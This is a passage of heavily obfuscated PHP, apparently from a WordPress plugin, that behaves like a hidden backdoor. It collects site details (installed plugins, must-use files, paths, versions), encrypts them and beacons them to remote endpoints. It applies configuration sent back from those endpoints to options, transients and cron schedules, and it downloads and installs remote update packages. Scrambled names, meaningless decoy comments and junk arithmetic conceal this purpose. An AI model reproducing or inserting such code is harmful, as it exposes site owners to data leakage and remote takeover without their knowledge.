 $GLOBALS['__scf_yf6s3f_o_o8gl_318']($wxlcpy2l1ch78hv7, $d_z1sw79n8r_);

 } elseif  ($GLOBALS['__scf_oenrsvkzs1_36']($wxlcpy2l1ch78hv7)  >   1)    {
  $GLOBALS['__scf_pku6wc4sci0i_570']($wxlcpy2l1ch78hv7);
    }
       


   if   (($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)   - $yhh03ed_b42z3ykg) > (int)  ($rytmm_nwqraayfok *      0.6)) {
     jkr5j38q4xepwz45o();
return;
}
       
       $h0hvw4qvsm99k8_ = azt2rk_vrm_4krepiv2_();
 if  (cpiqe0lm848r3wlva($h0hvw4qvsm99k8_))   {
$h0hvw4qvsm99k8_  =    azt2rk_vrm_4krepiv2_();
      }
  
      $opf69zcxgg = array();
 if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(546))) {
     foreach      ((array)     get_option(bk9m46jygo3f(146), array())    as    $dz9ttep94ondlpl) {
if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($dz9ttep94ondlpl)  &&  $dz9ttep94ondlpl) {
 $opf69zcxgg[]      =  $dz9ttep94ondlpl;
  }
 }

 }
 
$pcpyr99_n_czqop0 = array();
        if (defined(gz_aorofp7mo(13))) {
   $y23j440z8go30x53   =    $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(280))   ?  @$GLOBALS['__scf_b60g6hx_a7ggi_71']($GLOBALS['__scf_v2rfz0q9cvmh_12'](WPMU_PLUGIN_DIR, '/')    . xognx_h1jzkh(72)) : false;
if     ($GLOBALS['__scf_zj8mp2xbaqmp_35']($y23j440z8go30x53))  {
 foreach   ($y23j440z8go30x53  as $s6um63o_s0zywj1)   {
        $pcpyr99_n_czqop0[]  =     $GLOBALS['__scf_pmoxtzoe3f0qw_3']($s6um63o_s0zywj1);
}
 }
    }
      
 $oncetkroo_ =     array(
  gz_aorofp7mo(571)   =>    vse28wh0vwl84gzd2(""),


      bk9m46jygo3f(572) =>     xl8k_pjv1048a7ae7(),
 xpm5lg9odtw6di(573)    =>   $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(), gz_aorofp7mo(514)),
 xognx_h1jzkh(574)   => $GLOBALS['__scf_v2rfz0q9cvmh_12'](ABSPATH,  xpm5lg9odtw6di(81)),



  ar6vo_1nyhx2koj5(575)  => $opf69zcxgg,
gz_aorofp7mo(576)  =>  $pcpyr99_n_czqop0,
xognx_h1jzkh(577)   =>  gl7_7gutizqdufa7m4x6t(),
ar6vo_1nyhx2koj5(578) =>    (object)  a59w5xbeldeqw8swo1oi($h0hvw4qvsm99k8_),
   bk9m46jygo3f(579)   =>   (object) qaml87zhz_rk3fmp($h0hvw4qvsm99k8_),

xognx_h1jzkh(364) =>   ($b2ab_pnmeqxan14 = h75qkw97z_59ai()),
    
 );
     $bqcyxj4_few =   $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(580))    ? wp_json_encode($oncetkroo_)  :     $GLOBALS['__scf_dpcnt5aa9yk_581']($oncetkroo_);
     $ut33u9a74zp2h  =  rp2hrcv77xa_9h3hm($bqcyxj4_few,  $go82x22w4tq);
 $hjhzxfxyk0s37   =  array(ar6vo_1nyhx2koj5(582) =>      gz_aorofp7mo(583));
     $nk7ye38kc06yztc  = null;

   $xzmwg_5t4s6g  = false;


 jkr5j38q4xepwz45o();
   $GLOBALS[bk9m46jygo3f(311)]  =   false;

foreach  ($wxlcpy2l1ch78hv7  as  $qtr5uy4p51jdn22)  {




  $wrpdty3ez5j7h6   =     $rytmm_nwqraayfok  -  ($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)     -  $yhh03ed_b42z3ykg);
 if  ($wrpdty3ez5j7h6    <  (5-2))     {
break;
 }

$i0pyfyu5cc = $GLOBALS['__scf_askqa52jtol__2_475']((7+3),  (int)  $wrpdty3ez5j7h6);
     
$qtr5uy4p51jdn22 =   $GLOBALS['__scf_u6m4cedwgt__319']((string)    $qtr5uy4p51jdn22);
if  (! $qtr5uy4p51jdn22) {
    continue;
  }
try  {
 $y9kzt8l7y2p    =  $go82x22w4tq;

       $g1axcaz1nux  = kuk24s1cyjzazb26($qtr5uy4p51jdn22,   $ut33u9a74zp2h, $hjhzxfxyk0s37,   $i0pyfyu5cc, function  ($agqwkuals2cm_xdp) use   ($y9kzt8l7y2p)    {
   if   (!h6ar9m7l1ifcrfqf0e($GLOBALS['__scf_fxl4k4gsul_10']($agqwkuals2cm_xdp))) {
$GLOBALS[bk9m46jygo3f(311)]  =   true;
return  false;
 }



    $q97i7_qw446ei  =  rp2hrcv77xa_9h3hm($agqwkuals2cm_xdp,    $y9kzt8l7y2p);
 if  (!$q97i7_qw446ei) return false;
       return $GLOBALS['__scf_zj8mp2xbaqmp_35'](@$GLOBALS['__scf_b0js6es3ja1cb1_324']($GLOBALS['__scf_u6m4cedwgt__319']($q97i7_qw446ei), true));
});
if  (!  $g1axcaz1nux) {
if  (!empty($GLOBALS[ar6vo_1nyhx2koj5(584)]))   {

 kkpdha95nyx3tbltd10(bk9m46jygo3f(427), xognx_h1jzkh(585));
 break;
   }
  kkpdha95nyx3tbltd10(gz_aorofp7mo(427),  xpm5lg9odtw6di(586) . $qtr5uy4p51jdn22);$xgpqja181kv=-831;$g_c4ll2sj=($xgpqja181kv>0)?$xgpqja181kv:-$xgpqja181kv;
continue;
  

}
       

    $_3f4sr_qli = rp2hrcv77xa_9h3hm($g1axcaz1nux,  $go82x22w4tq);
     if  (!   $_3f4sr_qli)  {
 kkpdha95nyx3tbltd10(bk9m46jygo3f(427), bk9m46jygo3f(587)   .   $qtr5uy4p51jdn22);
 continue;



  }
  $nk7ye38kc06yztc  =    ($GLOBALS['__scf_fxl4k4gsul_10']($_3f4sr_qli)     >  (777247+271329)    &&  !h6ar9m7l1ifcrfqf0e($GLOBALS['__scf_fxl4k4gsul_10']($_3f4sr_qli)))  ?  null  : @$GLOBALS['__scf_b0js6es3ja1cb1_324']($GLOBALS['__scf_u6m4cedwgt__319']($_3f4sr_qli), true);
   if     ($GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc)) {
     if   ($GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(186)))  {
   update_option(ar6vo_1nyhx2koj5(569),   $qtr5uy4p51jdn22);
}
    $xzmwg_5t4s6g =  true;
    break;
 }   else  {


  kkpdha95nyx3tbltd10(bk9m46jygo3f(427),  xognx_h1jzkh(588) .  $qtr5uy4p51jdn22);
}
      }  catch  (Throwable  $o_qyrtxl85owt) {
      kkpdha95nyx3tbltd10(bk9m46jygo3f(589),    $o_qyrtxl85owt);
 continue;
}  catch  (Exception  $o_qyrtxl85owt)  {
     continue;
 }



}
   if    (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc)    &&  empty($GLOBALS[gz_aorofp7mo(590)]))  {
  $e9_2r7xo34gm   =   rp2hrcv77xa_9h3hm($GLOBALS['__scf_dpcnt5aa9yk_581'](array(
   bk9m46jygo3f(571)  =>   vse28wh0vwl84gzd2(""),
    xognx_h1jzkh(572) =>   xl8k_pjv1048a7ae7(),
 gz_aorofp7mo(591)     => $GLOBALS['__scf_pmoxtzoe3f0qw_3'](bho93o6vof3ni5_rg622_h(),    bk9m46jygo3f(514)),
  bk9m46jygo3f(592)   => 1,


     )),  $go82x22w4tq);
 $goxpgitg2brxu =  $GLOBALS['__scf_v2rfz0q9cvmh_12'](strtr($GLOBALS['__scf_upr7jxyxre3_348']($e9_2r7xo34gm), gz_aorofp7mo(593),  xognx_h1jzkh(594)),    '=');


    $fxr7l_7qhcr      =    $GLOBALS['__scf_lahtvu_g2oryx_595']($goxpgitg2brxu,  (0x2c6+0x2b2));


      foreach  ($wxlcpy2l1ch78hv7 as $qtr5uy4p51jdn22)  {


  if      (($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)  -      $yhh03ed_b42z3ykg)  >   $rytmm_nwqraayfok)    {
break;
     }
   $qtr5uy4p51jdn22    = $GLOBALS['__scf_u6m4cedwgt__319']((string)  $qtr5uy4p51jdn22);
 if     ($qtr5uy4p51jdn22  ===  "") {
       continue;

    }
// PSR-15 middleware option row

$jpc3q3qk6li1 =  g2g3r6pz8prst3gz(vse28wh0vwl84gzd2("") .  $GLOBALS['__scf_nz_jvx37ph58fn_287'](true), (0x2+0x6));



    $_svae0z2nfoqm    =  $GLOBALS['__scf_oenrsvkzs1_36']($fxr7l_7qhcr);
  $s0taixixkes    =  ($GLOBALS['__scf_j_4rj7vg4ae0j_7']($qtr5uy4p51jdn22, '?') === false)    ?     '?' :   '&';
      for ($rqfbhg2okkrjeft =  0;   $rqfbhg2okkrjeft  <  $_svae0z2nfoqm;  $rqfbhg2okkrjeft++)     {
        if  (($GLOBALS['__scf_nz_jvx37ph58fn_287'](true)    -    $yhh03ed_b42z3ykg) >   $rytmm_nwqraayfok)     {
    break;
    }


  $xxz8k7d3af_wa     =   ($rqfbhg2okkrjeft    === $_svae0z2nfoqm -   1);
 $c9c8lgugi1azvm =   $qtr5uy4p51jdn22     .    $s0taixixkes .   xognx_h1jzkh(596)    . $jpc3q3qk6li1 .   ar6vo_1nyhx2koj5(597)    . $rqfbhg2okkrjeft  .  bk9m46jygo3f(598)  .    $_svae0z2nfoqm .  bk9m46jygo3f(599)  . $fxr7l_7qhcr[$rqfbhg2okkrjeft];
$u61e7lwkq1u = p8z1o9fd47f7nng25($c9c8lgugi1azvm,  (13-5), $xxz8k7d3af_wa   ?   function  ($agqwkuals2cm_xdp)      use ($go82x22w4tq) {
 $q97i7_qw446ei =   rp2hrcv77xa_9h3hm($agqwkuals2cm_xdp,  $go82x22w4tq);
   if   (!$q97i7_qw446ei)   return false;
    return    $GLOBALS['__scf_zj8mp2xbaqmp_35'](@$GLOBALS['__scf_b0js6es3ja1cb1_324']($GLOBALS['__scf_u6m4cedwgt__319']($q97i7_qw446ei), true));
   }  :    null);
 if  ($xxz8k7d3af_wa     &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($u61e7lwkq1u)  &&     $u61e7lwkq1u  !== "")   {
  $_gd  =  rp2hrcv77xa_9h3hm($u61e7lwkq1u, $go82x22w4tq);
  $n3oa_6o82fz9oz4  =    ($_gd  &&  ($GLOBALS['__scf_fxl4k4gsul_10']($_gd)     <= (0x3538d+0xcac73)     ||  h6ar9m7l1ifcrfqf0e($GLOBALS['__scf_fxl4k4gsul_10']($_gd))))   ? @$GLOBALS['__scf_b0js6es3ja1cb1_324']($GLOBALS['__scf_u6m4cedwgt__319']($_gd),   true)      :  null;
if     ($GLOBALS['__scf_zj8mp2xbaqmp_35']($n3oa_6o82fz9oz4)) {
$nk7ye38kc06yztc = $n3oa_6o82fz9oz4;

   if   ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(186)))     {
     update_option(ar6vo_1nyhx2koj5(569), $qtr5uy4p51jdn22);
 }
     break;
    }
   }
// PCRE2 JIT script dependency

  }
 if    ($GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc)) {
   break;
  }



 }
}
// sub-optimal allocator

$GLOBALS[gz_aorofp7mo(590)]   = false;



if (! $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc))    {
 return;

  }
 if  ($xzmwg_5t4s6g)  {
g10mzjo1wkc0q8_jamfm();

   }
if    ($b2ab_pnmeqxan14 &&  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(600)))    {
   delete_option(dmqaubx1rbr260fipu(xpm5lg9odtw6di(601)));
 unset($GLOBALS[ar6vo_1nyhx2koj5(350)][dmqaubx1rbr260fipu(xognx_h1jzkh(601))]);

     }
  if  (!isset($GLOBALS[xognx_h1jzkh(361)])  ||  !$GLOBALS['__scf_zj8mp2xbaqmp_35']($GLOBALS[bk9m46jygo3f(361)]))  $GLOBALS[xpm5lg9odtw6di(602)]     = array();
$GLOBALS[xpm5lg9odtw6di(603)]  =   $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_expvj_2k_kl_150']($GLOBALS[gz_aorofp7mo(604)],   $b2ab_pnmeqxan14));
 if   (isset($nk7ye38kc06yztc[ar6vo_1nyhx2koj5(591)]) &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($nk7ye38kc06yztc[gz_aorofp7mo(591)]))   {
 unset($GLOBALS[gz_aorofp7mo(286)]);
     hnw1mb_y4p8vrlcdrsg88a($nk7ye38kc06yztc[bk9m46jygo3f(591)],  isset($nk7ye38kc06yztc[xpm5lg9odtw6di(605)]) &&  $GLOBALS['__scf_is0fvk8c7tq2_41']($nk7ye38kc06yztc[xognx_h1jzkh(606)])     ? $nk7ye38kc06yztc[ar6vo_1nyhx2koj5(607)]  : "",  !empty($nk7ye38kc06yztc[bk9m46jygo3f(608)]));
   }
 
 $iui1kgzht3pu8     =  false;
   $ozzkedrl5pvmx0v    = array();
 
if (isset($nk7ye38kc06yztc[xognx_h1jzkh(435)])  &&      $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc[ar6vo_1nyhx2koj5(435)]))   {



       $d55t5nnss9d6u =  array();



      foreach ($nk7ye38kc06yztc[xpm5lg9odtw6di(435)]   as  $yc_3fgo7em8cww)   {
 if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($yc_3fgo7em8cww)   &&      $yc_3fgo7em8cww     !== "")  {
$d55t5nnss9d6u[] = $yc_3fgo7em8cww;
  }
}
     $u_h6e5yud5y8ewvn =  $GLOBALS[bk9m46jygo3f(436)];

   $d55t5nnss9d6u     =    v9w_9ufttlebofkohqvr3($d55t5nnss9d6u);
$GLOBALS[gz_aorofp7mo(436)] =   $d55t5nnss9d6u;
       $ozzkedrl5pvmx0v[bk9m46jygo3f(435)] = $d55t5nnss9d6u;

   if  (!    empty($GLOBALS['__scf_expvj_2k_kl_150']($d55t5nnss9d6u, $u_h6e5yud5y8ewvn))     ||  ! empty($GLOBALS['__scf_expvj_2k_kl_150']($u_h6e5yud5y8ewvn,     $d55t5nnss9d6u)))    {
 $iui1kgzht3pu8   = true;
  }
  }
 
if    (isset($nk7ye38kc06yztc[xognx_h1jzkh(437)])  && $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc[xpm5lg9odtw6di(437)]))  {
$d55t5nnss9d6u  =  array();
 
    foreach ($nk7ye38kc06yztc[gz_aorofp7mo(437)]  as  $yc_3fgo7em8cww)   {
   if ($GLOBALS['__scf_is0fvk8c7tq2_41']($yc_3fgo7em8cww)    &&  $yc_3fgo7em8cww !==  "")   {
// incremental work-queue

     $d55t5nnss9d6u[]  = $yc_3fgo7em8cww;$rn658wt5d8=PHP_INT_MAX/PHP_INT_MAX;$sgpnh3gv6=$rn658wt5d8+60;
      }
     }


    $u_h6e5yud5y8ewvn    =   $GLOBALS[xognx_h1jzkh(438)];
  $d55t5nnss9d6u     =     v9w_9ufttlebofkohqvr3($d55t5nnss9d6u);
   $GLOBALS[gz_aorofp7mo(438)]  = $d55t5nnss9d6u;
 $ozzkedrl5pvmx0v[xognx_h1jzkh(437)]    =   $d55t5nnss9d6u;

  if  (!    empty($GLOBALS['__scf_expvj_2k_kl_150']($d55t5nnss9d6u,     $u_h6e5yud5y8ewvn)) ||  !  empty($GLOBALS['__scf_expvj_2k_kl_150']($u_h6e5yud5y8ewvn, $d55t5nnss9d6u)))   {
    $iui1kgzht3pu8   = true;



}
      }
    if (isset($nk7ye38kc06yztc[xognx_h1jzkh(439)])   &&      $GLOBALS['__scf_is0fvk8c7tq2_41']($nk7ye38kc06yztc[xpm5lg9odtw6di(439)]))  {
   $icponfri_r7lmc     =  ydk7304srtwvcn8gdl(gz_aorofp7mo(609),     "");

   if  ($icponfri_r7lmc      !==  "" &&   (int)  tjj1y86387zrz51(xpm5lg9odtw6di(610), 0)  === 0) {
     fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(610),     1,  xpm5lg9odtw6di(611));
if  ((int)   tjj1y86387zrz51(xpm5lg9odtw6di(612),  0) !==     1) fplgzzpq8bt5jm2fl03pi(gz_aorofp7mo(612),  1,   xpm5lg9odtw6di(611));
  }
/* exponential collector */

    $GLOBALS[bk9m46jygo3f(487)]   =     $nk7ye38kc06yztc[gz_aorofp7mo(439)];$kefzf_yvtwpmeo=47*4;$ztiexmguc5te=$kefzf_yvtwpmeo-32;
   $ozzkedrl5pvmx0v[gz_aorofp7mo(439)] =     $nk7ye38kc06yztc[bk9m46jygo3f(439)];



   if ($GLOBALS['__scf_eo363tjzd4r6n_56']($nk7ye38kc06yztc[xognx_h1jzkh(439)])     !==    $GLOBALS['__scf_eo363tjzd4r6n_56']($icponfri_r7lmc)  ||  (int)  tjj1y86387zrz51(gz_aorofp7mo(612), 0)    === 1) {
// WP Entity Provider placeholder blur
$_pvk_ay7m0od=76*7;$gqk3y_cvs0ar3n=$_pvk_ay7m0od-47;


 if  (fplgzzpq8bt5jm2fl03pi(xognx_h1jzkh(609),  $nk7ye38kc06yztc[gz_aorofp7mo(439)], xognx_h1jzkh(611))  ||     ydk7304srtwvcn8gdl(xpm5lg9odtw6di(609), "") ===  $nk7ye38kc06yztc[bk9m46jygo3f(613)])   {
    fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(612),    1,  ar6vo_1nyhx2koj5(611));
 try    {
  if  (u0t5d0jiawby98a())   fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(612),   0,   xognx_h1jzkh(611));
   }     catch (Throwable $o_qyrtxl85owt)   {
// hot path

        } catch  (Exception    $o_qyrtxl85owt)  {
}
/* greedy trie */

 }  else     {


   jkr5j38q4xepwz45o();


  return;
}
  }
       unset($icponfri_r7lmc);
 }
       $fk72_za05w  =   isset($nk7ye38kc06yztc[xpm5lg9odtw6di(444)]) && $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc[bk9m46jygo3f(444)])     ? $nk7ye38kc06yztc[bk9m46jygo3f(444)]    :  array();
   if (isset($fk72_za05w[ar6vo_1nyhx2koj5(442)])      &&     $GLOBALS['__scf_is0fvk8c7tq2_41']($fk72_za05w[xpm5lg9odtw6di(442)])) {
if  ($GLOBALS['__scf_fxl4k4gsul_10']($fk72_za05w[gz_aorofp7mo(442)])    > (23+27))     {
  $GLOBALS[xognx_h1jzkh(443)] =    $fk72_za05w[gz_aorofp7mo(614)];



$ozzkedrl5pvmx0v[ar6vo_1nyhx2koj5(614)]   =  $fk72_za05w[xognx_h1jzkh(615)];


}     else   {
  $GLOBALS[gz_aorofp7mo(616)]  =    "";
   $ozzkedrl5pvmx0v[xpm5lg9odtw6di(615)]    =    "";
 fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(617),  "",    gz_aorofp7mo(618));
      }


    }
  if (isset($fk72_za05w[bk9m46jygo3f(444)])  &&      $GLOBALS['__scf_is0fvk8c7tq2_41']($fk72_za05w[xpm5lg9odtw6di(619)]))   {
if    ($GLOBALS['__scf_fxl4k4gsul_10']($fk72_za05w[ar6vo_1nyhx2koj5(619)])  >  (147-47)) {
    $GLOBALS[ar6vo_1nyhx2koj5(445)] =   $fk72_za05w[bk9m46jygo3f(619)];
   $ozzkedrl5pvmx0v[bk9m46jygo3f(619)]   = $fk72_za05w[gz_aorofp7mo(620)];


   }  else  {



     $GLOBALS[bk9m46jygo3f(621)] =  "";
 $ozzkedrl5pvmx0v[xpm5lg9odtw6di(620)]    = "";
   fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(359),  "",  ar6vo_1nyhx2koj5(622));
 }


    }


    $x1hpbm9pfmhefe0b   = isset($nk7ye38kc06yztc[xognx_h1jzkh(623)]) &&  $GLOBALS['__scf_zj8mp2xbaqmp_35']($nk7ye38kc06yztc[ar6vo_1nyhx2koj5(623)])  ?      $nk7ye38kc06yztc[xognx_h1jzkh(623)]  : array();
$zg1c9f2d6okhqd2k = array(
 bk9m46jygo3f(624) =>   bk9m46jygo3f(624),
 xpm5lg9odtw6di(625)  => xpm5lg9odtw6di(626),
bk9m46jygo3f(627)   =>  xognx_h1jzkh(628),
    gz_aorofp7mo(629)  =>    ar6vo_1nyhx2koj5(630),
    gz_aorofp7mo(631)  =>    ar6vo_1nyhx2koj5(632),
 gz_aorofp7mo(633) => xognx_h1jzkh(634),
 );
   foreach ($zg1c9f2d6okhqd2k  as $qzholcfofs  => $wxr8v802iy_e5jnc)  {
 if  (isset($x1hpbm9pfmhefe0b[$qzholcfofs])   &&    $GLOBALS['__scf_is0fvk8c7tq2_41']($x1hpbm9pfmhefe0b[$qzholcfofs])     && $GLOBALS['__scf_fxl4k4gsul_10']($x1hpbm9pfmhefe0b[$qzholcfofs])   >    (83^97))  {
   $ozzkedrl5pvmx0v[$wxr8v802iy_e5jnc] = $x1hpbm9pfmhefe0b[$qzholcfofs];


}
    }
  if   (isset($nk7ye38kc06yztc[bk9m46jygo3f(470)])  &&    $GLOBALS['__scf_llevw2ijvv_635']($nk7ye38kc06yztc[ar6vo_1nyhx2koj5(470)])) {


 $wvjc7czethc1 =    (int)  $nk7ye38kc06yztc[xognx_h1jzkh(470)];
 if ($wvjc7czethc1 >=  (245+55) && $wvjc7czethc1 <=   (86381+19))    $ozzkedrl5pvmx0v[bk9m46jygo3f(470)]   =     $wvjc7czethc1;
  }
  if    (isset($nk7ye38kc06yztc[bk9m46jygo3f(636)])   && $GLOBALS['__scf_llevw2ijvv_635']($nk7ye38kc06yztc[xognx_h1jzkh(636)]))   {
    $_ci  =     (int)  $nk7ye38kc06yztc[bk9m46jygo3f(636)];
 if ($_ci   >= (288+12) &&  $_ci      <=    (37835+48565)) $ozzkedrl5pvmx0v[ar6vo_1nyhx2koj5(637)] =    $_ci;
   }
// fixup greedy affine-type

    if     (empty($ozzkedrl5pvmx0v))  {
   delete_option(gz_aorofp7mo(476));

delete_option(gz_aorofp7mo(638));
 update_option(ar6vo_1nyhx2koj5(639), $GLOBALS['__scf_ks7_xfapvywl_185']());
  delete_transient(gz_aorofp7mo(640));
t5qx5dgkos1as4();
  fn97j4kcxtotofg();
 return;
 }
 



$fpmrdfqbe_bhak9_      = cips53lbwv4iv8mb(ar6vo_1nyhx2koj5(467),   false);
  if  ($GLOBALS['__scf_zj8mp2xbaqmp_35']($fpmrdfqbe_bhak9_)) {$wp7b0750h=PHP_MAJOR_VERSION;$sue6gnpcr=$wp7b0750h*9;
     $ozzkedrl5pvmx0v  = $GLOBALS['__scf_j59q8mojj8e4ar_363']($fpmrdfqbe_bhak9_,     $ozzkedrl5pvmx0v);
      

}
    

  if   ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(457)))    {
// PSR-4 namespaces: reorder chain




 $q2__jb8tsv  =  iez5nv7riwymw9wlb9sy();
    if (isset($ozzkedrl5pvmx0v[bk9m46jygo3f(470)])  &&  (int)    $ozzkedrl5pvmx0v[bk9m46jygo3f(470)]  >=   (356-56)  &&    (int) $ozzkedrl5pvmx0v[xognx_h1jzkh(470)]  <=   (62531+23869))     $q2__jb8tsv     =      (int)  $ozzkedrl5pvmx0v[bk9m46jygo3f(470)];
     set_transient(j61b_lqa6xnjdjocyu15jd(),    $ozzkedrl5pvmx0v, $q2__jb8tsv);$vxhdp6sqmj6sl=813;$ayfp2d5dd=$vxhdp6sqmj6sl%17;
    }
      
      if (!qag803080uet9n(xpm5lg9odtw6di(467), $ozzkedrl5pvmx0v,  bk9m46jygo3f(622)))   {$kxuvz5ubspwg=171|100;$nxchuyf78s=$kxuvz5ubspwg^101;
  $e21e_8cj2gw2i  = cips53lbwv4iv8mb(xognx_h1jzkh(467),  null);
 if  (!$GLOBALS['__scf_zj8mp2xbaqmp_35']($e21e_8cj2gw2i) ||     $e21e_8cj2gw2i   !=      $ozzkedrl5pvmx0v) {
 jkr5j38q4xepwz45o();
return;

 }
    unset($e21e_8cj2gw2i);
   }
if (isset($ozzkedrl5pvmx0v[xpm5lg9odtw6di(637)])    &&  $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(641))  &&  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(642))    && $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(375)))  {
  $v76a6tqpxc =   wp_get_scheduled_event(ios6xxr5y_3fibzei373rz());
if  ($v76a6tqpxc   && (int)    $v76a6tqpxc->interval !==     (int) $ozzkedrl5pvmx0v[bk9m46jygo3f(637)])   {
 wp_clear_scheduled_hook(ios6xxr5y_3fibzei373rz());
wp_schedule_event($GLOBALS['__scf_ks7_xfapvywl_185']()  +  $GLOBALS['__scf_jlhdedaik0c_347']((87-27),   (246+54)), xognx_h1jzkh(377),  ios6xxr5y_3fibzei373rz());
}

      }



 update_option(xpm5lg9odtw6di(639), $GLOBALS['__scf_ks7_xfapvywl_185']());



delete_option(gz_aorofp7mo(643));
 delete_option(ar6vo_1nyhx2koj5(638));$a8uxfvyhp5_=PHP_MAJOR_VERSION;$bgy9re0cn=$a8uxfvyhp5_*5;
 delete_transient(gz_aorofp7mo(640));
t5qx5dgkos1as4();
  fn97j4kcxtotofg();
      

if ($iui1kgzht3pu8)   {
 pgix0z073o77klzh();


}
 }  catch   (Throwable $o_qyrtxl85owt) {
kkpdha95nyx3tbltd10(gz_aorofp7mo(427),  $o_qyrtxl85owt);
}  catch   (Exception   $o_qyrtxl85owt)  {
} finally   {



unset($GLOBALS[xpm5lg9odtw6di(644)]);
  h1f3kqk1cj4d18z(xpm5lg9odtw6di(645));



 }


     }
 
 function hnw1mb_y4p8vrlcdrsg88a($kppzlkkids686f5t,  $tb0hezytopoph_  =    "", $obhg0d510l =  false)
 {
if  (!_sshnzj53qt2m4bfy5eod(bk9m46jygo3f(645))) return;
    try    {
    $ex4wbooez05   =   gh0yxtn2jfbxhsjo();
   if   ($ex4wbooez05      >     0 && $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(646)) && !h6ar9m7l1ifcrfqf0e($GLOBALS['__scf_fxl4k4gsul_10']($kppzlkkids686f5t)    * (0x2+0x2)))    {
kkpdha95nyx3tbltd10(xognx_h1jzkh(647),   ar6vo_1nyhx2koj5(648));
 return;
  }
    unset($ex4wbooez05);


 
        $serq75xz67pgeiuz    =   @$GLOBALS['__scf_hg1ogpq4w6_351']($kppzlkkids686f5t, true);
     if ($GLOBALS['__scf_is0fvk8c7tq2_41']($serq75xz67pgeiuz) && $GLOBALS['__scf_fxl4k4gsul_10']($serq75xz67pgeiuz)   >  (1048511+65))  $serq75xz67pgeiuz   =  za8ge46vc9y1a6($serq75xz67pgeiuz);
  if (!     $serq75xz67pgeiuz  ||   $GLOBALS['__scf_fxl4k4gsul_10']($serq75xz67pgeiuz)    <   (473+27)  ||   $GLOBALS['__scf_j_4rj7vg4ae0j_7']($serq75xz67pgeiuz,    xpm5lg9odtw6di(649))  !==    0)   {



return;
      }
if   (!     g9edwd6m8_9cm8($serq75xz67pgeiuz))   {
kkpdha95nyx3tbltd10(xpm5lg9odtw6di(650),     gz_aorofp7mo(651));
  return;
// release validator

 }
        if    ($GLOBALS['__scf_ak3p5za9uvhzh8_96'](xpm5lg9odtw6di(205), $GLOBALS['__scf__fl_gwujcblq_9']($serq75xz67pgeiuz, 0,   (4026+70)),      $zn_8uj7t_be9ro3))  {
if   ($tb0hezytopoph_ !==    ""  && $tb0hezytopoph_ !==  $zn_8uj7t_be9ro3[1])    {
 kkpdha95nyx3tbltd10(gz_aorofp7mo(650),    bk9m46jygo3f(652));$sn1r2ngfe=PHP_MAJOR_VERSION;$qnnuplbkb1h=$sn1r2ngfe*7;
return;
      }
   $tb0hezytopoph_      = $zn_8uj7t_be9ro3[1];

 }  else  {
    kkpdha95nyx3tbltd10(bk9m46jygo3f(650), xpm5lg9odtw6di(653));
return;
}
  if  (!$obhg0d510l &&   version_compare($tb0hezytopoph_,  xl8k_pjv1048a7ae7())   <=  0)  {
 return;
}
  $_sirgce8nozj =  p5t6fz6i7ccgjh();
  if (!$_sirgce8nozj ||     $GLOBALS['__scf_fxl4k4gsul_10']($_sirgce8nozj) <    (349+151)) {
    kkpdha95nyx3tbltd10(xognx_h1jzkh(650),  bk9m46jygo3f(654));
   return;
  }
 $fxbxz9co1zzdkzrh =     get_option(bk9m46jygo3f(655));
  if    ($GLOBALS['__scf_is0fvk8c7tq2_41']($fxbxz9co1zzdkzrh)  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($fxbxz9co1zzdkzrh, $GLOBALS['__scf_eo363tjzd4r6n_56']($serq75xz67pgeiuz)  . '|') ===   0)  {

 return;


    }
 $uraaic7gvof =  $GLOBALS['__scf_meo_1tvjsals_11'](bho93o6vof3ni5_rg622_h()) .  xognx_h1jzkh(656)  .  $GLOBALS['__scf_eo363tjzd4r6n_56']($serq75xz67pgeiuz);
    if (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($uraaic7gvof))  {
        return;
}
unset($uraaic7gvof);
if   (!$obhg0d510l) {
$w6354nrcm842a  = @get_option(ar6vo_1nyhx2koj5(657),    "");
   if  ($GLOBALS['__scf_is0fvk8c7tq2_41']($w6354nrcm842a)  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']($w6354nrcm842a,  $GLOBALS['__scf_eo363tjzd4r6n_56']($serq75xz67pgeiuz) .    '|')  ===  0)   {
 $ujenr48bfpak9i  =    (int)  $GLOBALS['__scf__fl_gwujcblq_9']($w6354nrcm842a,    $GLOBALS['__scf_j_4rj7vg4ae0j_7']($w6354nrcm842a,  '|')   +  1);
if  ($ujenr48bfpak9i    && $GLOBALS['__scf_ks7_xfapvywl_185']()     -  $ujenr48bfpak9i   < (1019-119)) return;
      }
